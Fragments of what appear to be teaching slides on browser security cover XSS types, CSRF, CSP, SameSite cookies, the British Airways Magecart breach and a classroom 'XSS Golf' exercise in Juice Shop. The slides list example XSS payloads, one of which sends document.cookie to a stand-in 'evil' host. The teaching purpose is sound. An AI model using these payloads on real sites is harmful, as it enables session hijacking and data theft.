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&amp; Client-Side Risks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security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XSS: reflected / stored / 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+ SameSite cookies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(CSP)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XSS Golf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4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interpreted as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fix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returns today — in the browser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security model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Policy (SOP): scripts only read data from same origin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= scheme + host +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DOM, storage scoped per origin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= injection into the page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JavaScript runs in the victim's browser, in the site's origin.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cookies/sessions, keylog, rewrite the page, pivot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 (output side)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XSS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Type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Where the payload lives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Reflected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 the request, echoed back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saved server-side, served to others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client-side JS writes untrusted data to the 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payloads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&lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;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onerror=alert(1)&gt;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"&gt;&lt;svg onload=alert(1)&gt;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matters: HTML body vs attribute vs JS vs URL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— riding the user's session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auto-sends cookies → attacker forges a state-changing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anti-CSRF tokens, SameSite cookies, check Origin/Referer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British Airways (2018)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injected malicious JS (Magecart) into BA's site/app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skimmed credit-card details as users typed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400,000 customers affected; £183M ICO fine (later reduced)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injection = real money + real fines.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 — Cross-site scripting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CWE-352 —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CWE-1021 — improper restriction of rendered UI (clickjacking)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encoding per context (HTML/attr/JS/URL)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auto-escaping (don't bypass with innerHTML/dangerouslySetInnerHTML)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— block inline/3rd-party scripts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+ SameSite cookies; anti-CSRF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⛳ Game — XSS Golf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shortest payload that pops alert(1) / steals a cookie in Juice Shop.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by character count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deploy a CSP + escaping that blocks every submitted payload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break a classmate's CSP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reflected + stored + DOM XSS in Juice Shop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cookie theft (sandbox)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output encoding + a strict CSP header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CSRF and its defense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XSS type with payload +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escaping that blocks them (show before/after)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note: why SameSite + tokens stop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is injection on the output side — encode for the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is defense-in-depth, not a substitute for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 cookies kill most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Authentication, sessions &amp; access control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5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